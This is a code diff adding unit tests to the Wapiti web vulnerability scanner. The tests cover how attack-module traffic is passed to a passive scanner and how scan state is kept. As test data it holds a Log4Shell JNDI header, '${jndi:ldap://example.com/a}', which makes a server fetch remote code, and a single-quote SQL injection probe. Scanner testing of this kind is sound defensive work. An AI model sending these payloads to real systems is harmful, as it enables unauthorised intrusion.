@@ -1,4 +1,5 @@
 import asyncio
+import inspect
 import types
 from pathlib import Path
 from typing import Tuple
@@ -10,14 +11,18 @@ import respx
 
 from wapitiCore.attack.active_scanner import (
     ActiveScanner,
+    PassiveTeeCrawler,
     UserChoice,
     activate_method_module,
     module_to_class_name,
 )
 from wapitiCore.attack.attack import Attack, AttackProtocol
+from wapitiCore.attack.passive_scanner import PassiveScanner
+from wapitiCore.controller.wapiti import Wapiti
 from wapitiCore.net import Request, Response
 from wapitiCore.net.classes import CrawlerConfiguration
 from wapitiCore.net.crawler import AsyncCrawler
+from wapitiCore.net.sql_persister import SqlPersister
 
 # pylint: disable=protected-access,redefined-outer-name
 
@@ -480,3 +485,264 @@ async def test_attack_wrapper_returns_early_when_task_cancelled():
     await scanner._attack_wrapper(attack_module, request, response, attacked_ids, semaphore)
 
     scanner.send_bug_report.assert_not_called()
+
+
+def make_fake_attack_class(name: str, passive_scan_responses: bool):
+    class FakeAttack:
+        PRIORITY = 5
+
+        def __init__(self, crawler, persister, attack_options, crawler_configuration):  # pylint: disable=unused-argument
+            self.crawler = crawler
+
+    FakeAttack.name = name
+    FakeAttack.passive_scan_responses = passive_scan_responses
+    return FakeAttack
+
+
+@pytest.mark.asyncio
+async def test_init_attack_modules_wraps_crawler_according_to_passive_scan_responses():
+    config = CrawlerConfiguration(Request("http://example.com"))
+    passive_scanner = MagicMock()
+    scanner = ActiveScanner(MagicMock(), config, passive_scanner=passive_scanner)
+    crawler = AsyncMock(spec=AsyncCrawler)
+
+    scanner._modules = {
+        "mod_injection": make_fake_attack_class("injection", passive_scan_responses=True),
+        "mod_discovery": make_fake_attack_class("discovery", passive_scan_responses=False),
+    }
+    scanner._activated_modules = {"injection": ["GET"], "discovery": ["GET"]}
+
+    modules = {module.name: module for module in await scanner.init_attack_modules(crawler)}
+
+    assert isinstance(modules["injection"].crawler, PassiveTeeCrawler)
+    assert modules["injection"].crawler._crawler is crawler
+    assert modules["injection"].crawler._passive_scanner is passive_scanner
+    # Opted-out modules get the raw crawler: no overhead at all
+    assert modules["discovery"].crawler is crawler
+
+
+@pytest.mark.asyncio
+async def test_init_attack_modules_uses_raw_crawler_without_passive_scanner():
+    config = CrawlerConfiguration(Request("http://example.com"))
+    scanner = ActiveScanner(MagicMock(), config)
+    crawler = AsyncMock(spec=AsyncCrawler)
+
+    scanner._modules = {"mod_injection": make_fake_attack_class("injection", passive_scan_responses=True)}
+    scanner._activated_modules = {"injection": ["GET"]}
+
+    modules = await scanner.init_attack_modules(crawler)
+
+    assert modules[0].crawler is crawler
+
+
+def test_passive_scan_responses_opt_outs():
+    """Injection modules keep the default (True). Discovery, brute-force, fingerprint and time-based
+    modules opt out: listing them all forces any new module to make an explicit choice."""
+    module_classes = ActiveScanner._load_attack_modules()
+    assert {
+        class_.name for class_ in module_classes.values() if not class_.passive_scan_responses
+    } == {
+        "backup", "brute_login_form", "buster", "cms", "htaccess", "htp", "methods", "network_device",
+        "nikto", "printer", "redirect", "ssl", "takeover", "timesql", "wapp", "wp_enum",
+    }
+    # Its error-based payload is the very case passive analysis of attack responses was added for
+    assert module_classes["mod_sql"].passive_scan_responses is True
+
+
+@pytest.mark.asyncio
+async def test_passive_tee_crawler_scans_response_and_returns_it():
+    crawler = AsyncMock(spec=AsyncCrawler)
+    response = MagicMock(spec=Response)
+    crawler.async_send.return_value = response
+    passive_scanner = MagicMock()
+    passive_scanner.scan_attack_response = AsyncMock()
+    request = Request("http://example.com/?id=%27")
+
+    tee = PassiveTeeCrawler(crawler, passive_scanner)
+    result = await tee.async_send(request, follow_redirects=True, timeout=3)
+
+    assert result is response
+    crawler.async_send.assert_awaited_once_with(
+        request, headers=None, follow_redirects=True, stream=False, timeout=3
+    )
+    passive_scanner.scan_attack_response.assert_awaited_once_with(request, response)
+
+
+@pytest.mark.asyncio
+async def test_passive_tee_crawler_forwards_positional_headers():
+    """mod_log4shell passes its malicious headers positionally."""
+    crawler = AsyncMock(spec=AsyncCrawler)
+    response = MagicMock(spec=Response)
+    crawler.async_send.return_value = response
+    passive_scanner = MagicMock()
+    passive_scanner.scan_attack_response = AsyncMock()
+    request = Request("http://example.com/")
+    headers = {"X-Api-Version": "${jndi:ldap://example.com/a}"}
+
+    tee = PassiveTeeCrawler(crawler, passive_scanner)
+    await tee.async_send(request, headers, follow_redirects=True)
+
+    crawler.async_send.assert_awaited_once_with(
+        request, headers=headers, follow_redirects=True, stream=False, timeout=None
+    )
+    passive_scanner.scan_attack_response.assert_awaited_once_with(request, response)
+
+
+def test_passive_tee_crawler_mirrors_async_send_signature():
+    """A parameter added to AsyncCrawler.async_send must be added to the tee too."""
+    def parameters(function):
+        return [(param.name, param.kind, param.default) for param in inspect.signature(function).parameters.values()]
+
+    assert parameters(PassiveTeeCrawler.async_send) == parameters(AsyncCrawler.async_send)
+
+
+@pytest.mark.asyncio
+@patch("wapitiCore.attack.active_scanner.logging.exception")
+async def test_passive_tee_crawler_never_breaks_the_attack(mock_log_exc):
+    crawler = AsyncMock(spec=AsyncCrawler)
+    response = MagicMock(spec=Response)
+    crawler.async_send.return_value = response
+    passive_scanner = MagicMock()
+    passive_scanner.scan_attack_response = AsyncMock(side_effect=ValueError("broken passive module"))
+
+    tee = PassiveTeeCrawler(crawler, passive_scanner)
+    result = await tee.async_send(Request("http://example.com/"))
+
+    assert result is response
+    mock_log_exc.assert_called_once()
+
+
+@pytest.mark.asyncio
+async def test_passive_tee_crawler_propagates_request_errors_without_scanning():
+    crawler = AsyncMock(spec=AsyncCrawler)
+    crawler.async_send.side_effect = httpx.ReadTimeout("timeout")
+    passive_scanner = MagicMock()
+    passive_scanner.scan_attack_response = AsyncMock()
+
+    tee = PassiveTeeCrawler(crawler, passive_scanner)
+    with pytest.raises(httpx.ReadTimeout):
+        await tee.async_send(Request("http://example.com/"))
+
+    passive_scanner.scan_attack_response.assert_not_awaited()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "args, kwargs",
+    [
+        ((), {"stream": True}),
+        ((None, False, True), {}),
+        ((None,), {"follow_redirects": False, "stream": True}),
+    ],
+    ids=["keyword", "positional", "mixed"],
+)
+async def test_passive_tee_crawler_does_not_consume_streamed_responses(args, kwargs):
+    crawler = AsyncMock(spec=AsyncCrawler)
+    passive_scanner = MagicMock()
+    passive_scanner.scan_attack_response = AsyncMock()
+    request = Request("http://example.com/")
+
+    tee = PassiveTeeCrawler(crawler, passive_scanner)
+    await tee.async_send(request, *args, **kwargs)
+
+    crawler.async_send.assert_awaited_once_with(
+        request, headers=None, follow_redirects=False, stream=True, timeout=None
+    )
+    passive_scanner.scan_attack_response.assert_not_awaited()
+
+
+def test_passive_tee_crawler_forwards_other_attributes():
+    crawler = MagicMock()
+    crawler.timeout = 7
+
+    tee = PassiveTeeCrawler(crawler, MagicMock())
+
+    assert tee.timeout == 7
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("user_choice", [UserChoice.CONTINUE, UserChoice.QUIT])
+@patch("wapitiCore.attack.active_scanner.AsyncCrawler.with_configuration")
+async def test_attack_restores_passive_state_before_and_persists_it_after_the_modules(
+    mock_with_configuration, user_choice
+):
+    mock_with_configuration.return_value.__aenter__.return_value = AsyncMock(spec=AsyncCrawler)
+    calls = []
+    passive_scanner = MagicMock()
+    passive_scanner.restore_state = AsyncMock(side_effect=lambda: calls.append("restore"))
+    passive_scanner.persist_state = AsyncMock(side_effect=lambda: calls.append("persist"))
+    persister = MagicMock()
+    persister.close = AsyncMock()
+    scanner = ActiveScanner(persister, MagicMock(), passive_scanner=passive_scanner)
+
+    attack_module = MagicMock()
+    attack_module.do_get, attack_module.do_post, attack_module.require = True, False, []
+    scanner.init_attack_modules = AsyncMock(return_value=[attack_module])
+
+    async def run_attack_module(_):
+        calls.append("attack")
+        scanner._user_choice = user_choice  # e.g. the user pressed Ctrl+C then "q"
+
+    scanner.run_attack_module = run_attack_module
+
+    assert await scanner.attack() is (user_choice != UserChoice.QUIT)
+    # Even when quitting, the state is saved so that a later resumed attack keeps deduplicating
+    assert calls == ["restore", "attack", "persist"]
+
+
+YSOD_BODY = (
+    "<html><head><title>Server Error in '/' Application.</title></head><body>"
+    "<b>Exception Details: </b>System.Data.SqlClient.SqlException: Unclosed quotation mark.<br>"
+    "<pre>[SqlException (0x80131904): Unclosed quotation mark.]\n</pre></body></html>"
+)
+
+
+class ModuleFakeInjection(Attack):
+    """Sends a single quote in the id parameter, like an injection module would."""
+    name = "fake_injection"
+
+    async def attack(self, request: Request, response: Response):
+        await self.crawler.async_send(Request("http://perdu.com/", get_params=[["id", "'"]]))
+
+
+@pytest.mark.asyncio
+@respx.mock
+@pytest.mark.parametrize("passive_scan_responses", [True, False], ids=["opted in", "opted out"])
+async def test_stacktrace_triggered_by_a_payload_is_reported_on_the_evil_request(
+    tmp_path, passive_scan_responses
+):
+    respx.get("http://perdu.com/", params={"id": "'"}).mock(
+        return_value=httpx.Response(500, text=YSOD_BODY, headers={"content-type": "text/html"})
+    )
+    persister = SqlPersister(str(tmp_path / "scan.db"))
+    await persister.create()
+    await persister.set_root_url("http://perdu.com/")
+
+    passive_scanner = PassiveScanner(persister=persister)
+    passive_scanner.set_modules({"stacktrace_disclosure": [], "http_headers": []})
+    config = CrawlerConfiguration(Request("http://perdu.com/"))
+    scanner = ActiveScanner(persister, config, passive_scanner=passive_scanner)
+    scanner._modules = {"mod_fake_injection": ModuleFakeInjection}
+    scanner._activated_modules = {"fake_injection": ["GET"]}
+
+    with patch.object(ModuleFakeInjection, "passive_scan_responses", passive_scan_responses):
+        async with AsyncCrawler.with_configuration(config) as crawler:
+            modules = await scanner.init_attack_modules(crawler)
+            await modules[0].attack(Request("http://perdu.com/"), MagicMock(spec=Response))
+
+    payloads = [payload async for payload in persister.get_payloads()]
+    await persister.close()
+
+    if not passive_scan_responses:
+        assert not payloads
+        return
+
+    # Header based passive modules do not run on attack traffic
+    assert [payload.module for payload in payloads] == ["stacktrace_disclosure"]
+    assert payloads[0].evil_request.get_params == [["id", "'"]]
+    assert payloads[0].response.status == 500
+
+
+def test_controller_shares_its_passive_scanner_with_the_active_scanner(tmp_path):
+    wapiti = Wapiti(Request("http://perdu.com/"), session_dir=str(tmp_path))
+    assert wapiti.active_scanner._passive_scanner is wapiti.passive_scaner
